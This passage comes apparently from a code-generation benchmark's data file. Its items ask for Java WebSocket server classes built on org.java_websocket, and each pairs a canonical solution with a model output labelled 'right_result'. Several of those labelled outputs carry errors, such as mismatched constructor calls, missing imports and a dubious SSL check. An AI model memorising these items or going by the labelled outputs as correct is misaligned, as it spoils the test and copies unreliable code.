    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private CountDownLatch countServerLatch;\n\n    public MyWebSocketServer(int port, CountDownLatch serverDownLatch) {\n        super(new InetSocketAddress(port));\n        this.countServerLatch = serverDownLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"New connection from \" + conn.getRemoteSocketAddress().getAddress().getHostAddress());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Closed connection to \" + conn.getRemoteSocketAddress().getAddress().getHostAddress());\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received message from \" + conn.getRemoteSocketAddress().getAddress().getHostAddress() + \": \" + message);\n        // Broadcast the message to all connected clients\n        broadcast(message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        System.err.println(\"Error occurred on connection \" + conn.getRemoteSocketAddress().getAddress().getHostAddress());\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started\");\n        countServerLatch.countDown();\n    }\n}\n```"
  },
  {
    "Task_id": 473,
    "Instruction": "Task Description: Implement a WebSocket server class that handles client connections, messages, and disconnections using the org.java_websocket library.\n\nClass Description: The SocketActivation class extends WebSocketServer to create a custom WebSocket server. It manages client connections, broadcasts messages to all connected clients, and handles server lifecycle events. The server tracks the number of connected clients and shuts down when no clients remain.\n\nAttributes:\n- clients: AtomicInteger - Tracks the number of currently connected clients\n\nMethods:\n- SocketActivation(ServerSocketChannel chan) -> None - Constructor that initializes the WebSocket server with the given ServerSocketChannel\n- onOpen(WebSocket conn, ClientHandshake handshake) -> None - Handles new client connections, sends welcome message, and broadcasts connection event\n- onClose(WebSocket conn, int code, String reason, boolean remote) -> None - Handles client disconnections, broadcasts departure event, and shuts down server if no clients remain\n- onMessage(WebSocket conn, String message) -> None - Broadcasts received text messages to all clients and logs the message\n- onMessage(WebSocket conn, ByteBuffer message) -> None - Broadcasts received binary messages to all clients and logs the message\n- onError(WebSocket conn, Exception ex) -> None - Handles and logs any errors that occur during WebSocket operations\n- onStart() -> None - Called when the server starts successfully, logs server startup",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.ServerSocketChannel;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class SocketActivation extends WebSocketServer {\n\n    private AtomicInteger clients = new AtomicInteger(0);\n\n    public SocketActivation(ServerSocketChannel chan) {\n        super(chan);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        conn.send(\"Welcome to the server!\");\n        broadcast(\"new connection: \" + handshake.getResourceDescriptor());\n        if(clients.get() == 0) {\n            broadcast(\"You are the first client to join\");\n        }\n        System.out.println(conn.getRemoteSocketAddress().getAddress().getHostAddress() + \" entered the room!\");\n        clients.incrementAndGet();\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        broadcast(conn + \" has left the room!\");\n        System.out.println(conn + \" has left the room!\");\n        if(clients.decrementAndGet() <= 0) {\n            System.out.println(\"No more clients left, exiting\");\n            System.exit(0);\n        }\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        broadcast(message);\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        broadcast(message.array());\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class SocketActivation extends WebSocketServer {\n    private final AtomicInteger clients = new AtomicInteger(0);\n\n    public SocketActivation(int port) {\n        super(new InetSocketAddress(port));\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        clients.incrementAndGet();\n        broadcast(\"Client \" + conn.getRemoteSocketAddress().getAddress().toString() + \" has joined\");\n        conn.send(\"Welcome to the WebSocket server!\");\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        clients.decrementAndGet();\n        broadcast(\"Client \" + conn.getRemoteSocketAddress().getAddress().toString() + \" has left\");\n        if (clients.get() == 0) {\n            close();\n        }\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        broadcast(message);\n        System.out.println(\"Received message from \" + conn.getRemoteSocketAddress().getAddress().toString() + \": \" + message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        broadcast(message.array());\n        System.out.println(\"Received binary message from \" + conn.getRemoteSocketAddress().getAddress().toString());\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"WebSocket server started on port \" + getPort());\n    }\n}\n```"
  },
  {
    "Task_id": 474,
    "Instruction": "Task Description: Implement a WebSocket server class that handles client connections, messages, and disconnections using the org.java_websocket library. The server should assign unique IDs to clients and log connection events.\n\nClass Description: ChatServerAttachmentExample is a WebSocket server implementation that manages client connections, tracks clients with unique IDs, and handles text/binary messages. It extends WebSocketServer from the org.java_websocket library.\n\nAttributes:\n- index: Integer - Tracks the next available client ID to be assigned\n\nMethods:\n- Constructor(port: int) -> None - Creates server instance bound to specified port\n- Constructor(address: InetSocketAddress) -> None - Creates server instance bound to specified address\n- onOpen(conn: WebSocket, handshake: ClientHandshake) -> void - Handles new client connections, assigns ID\n- onClose(conn: WebSocket, code: int, reason: String, remote: boolean) -> void - Handles client disconnections\n- onMessage(conn: WebSocket, message: String) -> void - Processes text messages from clients\n- onMessage(conn: WebSocket, message: ByteBuffer) -> void - Processes binary messages from clients\n- onError(conn: WebSocket, ex: Exception) -> void - Handles connection errors\n- onStart() -> void - Called when server starts successfully",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class ChatServerAttachmentExample extends WebSocketServer {\n\n    Integer index = 0;\n\n    public ChatServerAttachmentExample(int port) throws UnknownHostException {\n        super(new InetSocketAddress(port));\n    }\n\n    public ChatServerAttachmentExample(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        conn.setAttachment(index);\n        index++;\n        System.out.println(\n            conn.getRemoteSocketAddress().getAddress().getHostAddress() + \" entered the room! ID: \"\n                + conn.<Integer>getAttachment());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(conn + \" has left the room! ID: \" + conn.<Integer>getAttachment());\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class ChatServerAttachmentExample extends WebSocketServer {\n    private int index = 0;\n    private Map<WebSocket, Integer> clientIds = new HashMap<>();\n\n    public ChatServerAttachmentExample(int port) {\n        super(port);\n    }\n\n    public ChatServerAttachmentExample(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        int clientId = index++;\n        clientIds.put(conn, clientId);\n        System.out.println(\"Client connected: \" + clientId);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        int clientId = clientIds.getOrDefault(conn, -1);\n        clientIds.remove(conn);\n        System.out.println(\"Client disconnected: \" + clientId);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        int clientId = clientIds.getOrDefault(conn, -1);\n        System.out.println(\"Client \" + clientId + \" sent: \" + message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        int clientId = clientIds.getOrDefault(conn, -1);\n        System.out.println(\"Client \" + clientId + \" sent binary data\");\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        System.err.println(\"Error with client: \" + ex.getMessage());\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started\");\n    }\n}\n```"
  },
  {
    "Task_id": 475,
    "Instruction": "Task Description: Implement a WebSocket server class in Java using the org.java_websocket library to handle client connections, messages, disconnections, and errors.\n\nClass Description: The WSocketServer class extends WebSocketServer to create a custom WebSocket server that manages client connections and communication. It handles lifecycle events including connection opening, message reception, connection closing, and errors. The server can broadcast messages to all connected clients.\n\nAttributes:\n- Inherited attributes from WebSocketServer (base class handles socket connections and client management)\n\nMethods:\n- Constructor: WSocketServer(int port) throws UnknownHostException - Creates a server instance bound to the specified port.\n- Constructor: WSocketServer(InetSocketAddress address) - Creates a server instance bound to the specified socket address.\n- onOpen: onOpen(WebSocket conn, ClientHandshake handshake) -> void - Handles new client connections and sends a handshake confirmation.\n- onClose: onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Handles client disconnections and notifies other clients.\n- onMessage: onMessage(WebSocket conn, String message) -> void - Processes incoming messages from clients and echoes them back.\n- onError: onError(WebSocket conn, Exception ex) -> void - Handles errors occurring during WebSocket operations.\n- sendToClient: sendToClient(String text) -> void - Broadcasts a message to all connected clients (thread-safe operation).",
    "Canonical_solution": "import org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.util.Collection;\n\npublic class WSocketServer extends WebSocketServer {\n\n    public WSocketServer(int port) throws UnknownHostException {\n        super(new InetSocketAddress(port));\n    }\n\n    public WSocketServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket webSocket, ClientHandshake clientHandshake) {\n        this.sendToClient(\"[Handshake Ok]\");\n    }\n\n    @Override\n    public void onClose(WebSocket webSocket, int i, String s, boolean b) {\n        this.sendToClient(webSocket + \" close\");\n    }\n\n    @Override\n    public void onMessage(WebSocket webSocket, String message) {\n        this.sendToClient(message);\n    }\n\n    @Override\n    public void onError(WebSocket webSocket, Exception e) {\n        e.printStackTrace();\n        if (webSocket != null) {\n            // Error handling for specific WebSocket\n        }\n    }\n\n    public void sendToClient(String text) {\n        Collection<WebSocket> con = connections();\n        synchronized (con) {\n            for (WebSocket c : con) {\n                c.send(text);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\n\npublic class WSocketServer extends WebSocketServer {\n\n    public WSocketServer(int port) throws UnknownHostException {\n        super(port);\n    }\n\n    public WSocketServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"New connection from \" + conn.getRemoteSocketAddress().getAddress());\n        try {\n            conn.send(\"Connection established\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Closed connection to \" + conn.getRemoteSocketAddress().getAddress() + \" Code: \" + code + \" Reason: \" + reason);\n        broadcast(\"Client disconnected: \" + conn.getRemoteSocketAddress().getAddress());\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received message from \" + conn.getRemoteSocketAddress().getAddress() + \": \" + message);\n        broadcast(message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    public synchronized void sendToClient(String text) {\n        for (WebSocket conn : getConnections()) {\n            try {\n                conn.send(text);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 476,
    "Instruction": "Task Description: Create a WebSocket server class that handles client connections, messages, and disconnections using the org.java_websocket library. The server should echo received messages back to clients and maintain a connection counter.\n\nClass Description: AutobahnSSLServerTest is a WebSocket server implementation that extends WebSocketServer from the org.java_websocket library. It handles client connections by maintaining a counter, processes incoming messages by echoing them back, and provides basic connection lifecycle management.\n\nAttributes:\n- counter: [int] - Static counter tracking the number of opened connections\n\nMethods:\n- Constructor: [AutobahnSSLServerTest](int port, Draft d) -> [void] - Creates a server instance bound to the specified port using the given WebSocket draft protocol\n- Constructor: [AutobahnSSLServerTest](InetSocketAddress address, Draft d) -> [void] - Creates a server instance bound to the specified address using the given WebSocket draft protocol\n- onOpen: [onOpen](WebSocket conn, ClientHandshake handshake) -> [void] - Handles new client connections, increments connection counter\n- onClose: [onClose](WebSocket conn, int code, String reason, boolean remote) -> [void] - Handles client disconnections\n- onError: [onError](WebSocket conn, Exception ex) -> [void] - Handles connection errors\n- onStart: [onStart]() -> [void] - Called when server starts successfully\n- onMessage: [onMessage](WebSocket conn, String message) -> [void] - Echoes received text messages back to the client\n- onMessage: [onMessage](WebSocket conn, ByteBuffer blob) -> [void] - Echoes received binary messages back to the client",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.util.Collections;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class AutobahnSSLServerTest extends WebSocketServer {\n\n    private static int counter = 0;\n\n    public AutobahnSSLServerTest(int port, Draft d) throws UnknownHostException {\n        super(new InetSocketAddress(port), Collections.singletonList(d));\n    }\n\n    public AutobahnSSLServerTest(InetSocketAddress address, Draft d) {\n        super(address, Collections.singletonList(d));\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        counter++;\n        System.out.println(\"///////////Opened connection number\" + counter);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"closed\");\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        System.out.println(\"Error:\");\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        conn.send(message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer blob) {\n        conn.send(blob);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\n\npublic class AutobahnSSLServerTest extends WebSocketServer {\n    private static int counter = 0;\n\n    public AutobahnSSLServerTest(int port, Draft d) {\n        super(port, d);\n    }\n\n    public AutobahnSSLServerTest(InetSocketAddress address, Draft d) {\n        super(address, d);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        counter++;\n        System.out.println(\"New connection: \" + counter);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        counter--;\n        System.out.println(\"Closed connection: \" + counter);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        conn.send(message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer blob) {\n        conn.send(blob.array());\n    }\n}\n```"
  },
  {
    "Task_id": 477,
    "Instruction": "Task Description: Create a WebSocket server implementation using the org.java_websocket library to handle real-time bidirectional communication between clients and the server.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends WebSocketServer from the org.java_websocket library. It handles client connections, message processing, disconnections, and error scenarios in a WebSocket communication environment.\n\nAttributes:\nNone explicitly declared in this implementation (inherits attributes from WebSocketServer parent class)\n\nMethods:\n1. onOpen(WebSocket conn, ClientHandshake handshake) -> void - Called when a new client connects to the server\n   - conn: WebSocket - The client connection object\n   - handshake: ClientHandshake - The handshake data from the client\n\n2. onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Called when a client disconnects from the server\n   - conn: WebSocket - The client connection object\n   - code: int - The status code for disconnection\n   - reason: String - The reason for disconnection\n   - remote: boolean - Whether the disconnection was initiated by the remote host\n\n3. onMessage(WebSocket conn, String message) -> void - Called when a message is received from a client\n   - conn: WebSocket - The client connection object\n   - message: String - The received message content\n\n4. onError(WebSocket conn, Exception ex) -> void - Called when an error occurs\n   - conn: WebSocket - The client connection object (may be null if error isn't associated with a specific connection)\n   - ex: Exception - The exception that occurred\n\n5. onStart() -> void - Called when the server starts successfully\n\n6. LocalWebSocketFactory (nested class) - Implements WebSocketServerFactory for custom WebSocket creation\n   Methods:\n   a. createWebSocket(WebSocketAdapter a, Draft d) -> WebSocketImpl\n   b. createWebSocket(WebSocketAdapter a, List<Draft> drafts) -> WebSocketImpl\n   c. wrapChannel(SocketChannel channel, SelectionKey key) -> ByteChannel\n   d. close() -> void",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.channels.ByteChannel;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.SocketChannel;\nimport java.util.List;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.WebSocketAdapter;\nimport org.java_websocket.WebSocketImpl;\nimport org.java_websocket.WebSocketServerFactory;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        // Handle new client connection\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle client disconnection\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Process received message\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        // Handle errors\n    }\n\n    @Override\n    public void onStart() {\n        // Server startup logic\n    }\n}\n\nprivate class LocalWebSocketFactory implements WebSocketServerFactory {\n\n    @Override\n    public WebSocketImpl createWebSocket(WebSocketAdapter a, Draft d) {\n        return null;\n    }\n\n    @Override\n    public WebSocketImpl createWebSocket(WebSocketAdapter a, List<Draft> drafts) {\n        return null;\n    }\n\n    @Override\n    public ByteChannel wrapChannel(SocketChannel channel, SelectionKey key) throws IOException {\n        return null;\n    }\n\n    @Override\n    public void close() {\n        // Cleanup resources\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.util.List;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    public MyWebSocketServer(int port) {\n        super(new InetSocketAddress(port));\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"New connection from \" + conn.getRemoteSocketAddress().getAddress().getHostAddress());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed by \" + (remote ? \"remote peer\" : \"us\") + \" Code: \" + code + \" Reason: \" + reason);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received message from \" + conn.getRemoteSocketAddress().getAddress().getHostAddress() + \": \" + message);\n        // Echo the message back to the client\n        conn.send(message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n    }\n\n    public static class LocalWebSocketFactory implements WebSocketServerFactory {\n        @Override\n        public WebSocket createWebSocket(WebSocketAdapter a, Draft d) {\n            return new WebSocketImpl(a, d);\n        }\n\n        @Override\n        public WebSocket createWebSocket(WebSocketAdapter a, List<Draft> drafts) {\n            return new WebSocketImpl(a, drafts);\n        }\n\n        @Override\n        public ByteChannel wrapChannel(SocketChannel channel, SelectionKey key) throws Exception {\n            return channel;\n        }\n\n        @Override\n        public void close() {\n            // No-op\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 478,
    "Instruction": "Task Description: Create a WebSocket server class that handles client connections, messages, and disconnections using the org.java_websocket library. The server should also track SSL support and session information for testing purposes.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends the WebSocketServer class from the org.java_websocket library. It manages client connections, processes incoming messages, handles disconnections, and tracks SSL-related information for testing. The server notifies when it starts successfully via a CountDownLatch.\n\nAttributes:\n- testResult: [TestResult] - Stores test-related information including SSL support status and SSL session\n- countServerDownLatch: [CountDownLatch] - Used to signal when the server has successfully started\n\nMethods:\n- MyWebSocketServer([int port, TestResult testResult, CountDownLatch countServerDownLatch]) -> [void] - Constructor that initializes the server with specified port, test result object, and countdown latch\n- onOpen([WebSocket conn, ClientHandshake handshake]) -> [void] - Called when a new client connects; checks for SSL support and stores SSL session\n- onClose([WebSocket conn, int code, String reason, boolean remote]) -> [void] - Called when a client disconnects\n- onMessage([WebSocket conn, String message]) -> [void] - Called when a message is received from a client\n- onError([WebSocket conn, Exception ex]) -> [void] - Called when an error occurs; prints stack trace\n- onStart() -> [void] - Called when the server starts successfully; decrements the countdown latch",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport javax.net.ssl.SSLSession;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private final TestResult testResult;\n    private final CountDownLatch countServerDownLatch;\n\n    public MyWebSocketServer(int port, TestResult testResult, CountDownLatch countServerDownLatch) {\n        super(new InetSocketAddress(port));\n        this.testResult = testResult;\n        this.countServerDownLatch = countServerDownLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        testResult.hasSSLSupport = conn.hasSSLSupport();\n        try {\n            testResult.sslSession = conn.getSSLSession();\n        } catch (IllegalArgumentException e) {\n            // Ignore\n        }\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        countServerDownLatch.countDown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport javax.net.ssl.SSLContext;\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n    private TestResult testResult;\n    private CountDownLatch countServerDownLatch;\n\n    public MyWebSocketServer(int port, TestResult testResult, CountDownLatch countServerDownLatch) throws IOException {\n        super(new InetSocketAddress(port));\n        this.testResult = testResult;\n        this.countServerDownLatch = countServerDownLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        if (handshake.getHttpHeaders().containsKey(\"sec-websocket-protocol\") && handshake.getHttpHeaders().get(\"sec-websocket-protocol\").equals(\"wss\")) {\n            testResult.setSslSupport(true);\n            testResult.setSslSession(conn.getSession());\n        }\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle client disconnection\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Process incoming message\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        countServerDownLatch.countDown();\n    }\n}\n```"
  },
  {
    "Task_id": 479,
    "Instruction": "Task Description: Create a WebSocket server implementation using the org.java_websocket library that handles client connections, messages, and disconnections, with configurable connection limits and support for different WebSocket drafts.\n\nClass Description: AutobahnServerTest is a WebSocket server implementation that extends WebSocketServer from the org.java_websocket library. It manages client connections, processes incoming messages (both text and binary), tracks connection statistics, and supports graceful shutdown when reaching a configured connection limit.\n\nAttributes:\n- openCounter: [static int] - Tracks total number of opened connections\n- closeCounter: [static int] - Tracks total number of closed connections\n- limit: [int] - Maximum number of connections before server shutdown\n\nMethods:\n- Constructor: [AutobahnServerTest]([int port, int limit, Draft d]) -> [void] - Creates server instance with specified port, connection limit, and WebSocket draft\n- Constructor: [AutobahnServerTest]([InetSocketAddress address, Draft d]) -> [void] - Creates server instance with specified address and WebSocket draft\n- onOpen: [void]([WebSocket conn, ClientHandshake handshake]) -> [void] - Handles new client connections, increments openCounter\n- onClose: [void]([WebSocket conn, int code, String reason, boolean remote]) -> [void] - Handles client disconnections, increments closeCounter, shuts down server if limit reached\n- onError: [void]([WebSocket conn, Exception ex]) -> [void] - Handles connection errors, prints stack trace\n- onStart: [void]() -> [void] - Called when server starts, prints startup message\n- onMessage: [void]([WebSocket conn, String message]) -> [void] - Handles text messages, echoes back to client\n- onMessage: [void]([WebSocket conn, ByteBuffer blob]) -> [void] - Handles binary messages, echoes back to client",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.util.Collections;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.extensions.permessage_deflate.PerMessageDeflateExtension;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class AutobahnServerTest extends WebSocketServer {\n\n    private static int openCounter = 0;\n    private static int closeCounter = 0;\n    private int limit = Integer.MAX_VALUE;\n\n    public AutobahnServerTest(int port, int limit, Draft d) throws UnknownHostException {\n        super(new InetSocketAddress(port), Collections.singletonList(d));\n        this.limit = limit;\n    }\n\n    public AutobahnServerTest(InetSocketAddress address, Draft d) {\n        super(address, Collections.singletonList(d));\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        openCounter++;\n        System.out.println(\"///////////Opened connection number\" + openCounter);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        closeCounter++;\n        System.out.println(\"closed\");\n        if (closeCounter >= limit) {\n            System.exit(0);\n        }\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        System.out.println(\"Error:\");\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        conn.send(message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer blob) {\n        conn.send(blob);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\n\npublic class AutobahnServerTest extends WebSocketServer {\n    private static int openCounter = 0;\n    private static int closeCounter = 0;\n    private final int limit;\n\n    public AutobahnServerTest(int port, int limit, Draft d) {\n        super(port, d);\n        this.limit = limit;\n    }\n\n    public AutobahnServerTest(InetSocketAddress address, Draft d) {\n        super(address, d);\n        this.limit = Integer.MAX_VALUE; // Unlimited by default\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        openCounter++;\n        System.out.println(\"New connection opened. Total open connections: \" + openCounter);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        closeCounter++;\n        System.out.println(\"Connection closed. Total closed connections: \" + closeCounter);\n        if (openCounter >= limit) {\n            System.out.println(\"Connection limit reached. Shutting down server.\");\n            this.stop();\n        }\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started.\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        conn.send(message); // Echo back the received message\n    }\n\n    @Override\n    public void 